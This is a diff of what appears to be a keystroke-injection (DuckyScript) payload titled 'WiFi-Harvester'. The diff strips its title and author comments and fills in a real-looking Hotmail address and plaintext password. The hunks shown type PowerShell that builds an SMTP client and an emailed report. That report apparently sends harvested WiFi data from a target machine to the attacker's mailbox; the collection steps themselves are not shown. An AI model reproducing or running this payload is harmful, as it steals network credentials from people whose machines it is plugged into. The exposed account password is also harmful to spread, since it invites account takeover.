@@ -1,7 +1,4 @@
-REM Title: WiFi-Harvester
-REM Author: tony
-REM Based on the code of: Siem TTommy
-REM: Version 1.1
+
 DELAY 2000
 GUI d
 DELAY 150
@@ -37,13 +34,13 @@ STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 ENTER
 STRING $SMTPInfo.EnableSsl = $true
 ENTER
-STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('SENDER-EMAIL', 'SENDER-PASSWORD')
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('eliasbalinbin808@hotmail.com', 'Lazerman808')
 ENTER
 STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
 ENTER
-STRING $ReportEmail.From = 'SENDER-EMAIL'
+STRING $ReportEmail.From = 'eliasbalinbin808@hotmail.com'
 ENTER
-STRING $ReportEmail.To.Add('RECEIVER-EMAIL')
+STRING $ReportEmail.To.Add('eliasbalinbin808@hotmail.com')
 ENTER
 STRING $ReportEmail.Subject = "1337"
 ENTER
